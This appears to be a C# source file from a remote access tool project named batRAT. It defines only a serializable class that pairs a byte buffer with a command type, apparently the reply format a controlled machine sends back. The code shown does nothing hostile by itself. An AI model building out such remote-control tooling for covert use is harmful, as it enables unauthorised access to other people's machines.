using System;

namespace batRAT.Commands {
    [Serializable]
    public class CommandAnswer {

        public byte[] buffer;
        public CommandTypes type;

        public CommandAnswer(byte[] _buffer, CommandTypes _type) {
            buffer = _buffer;
            type = _type;
        }
        
    }
}
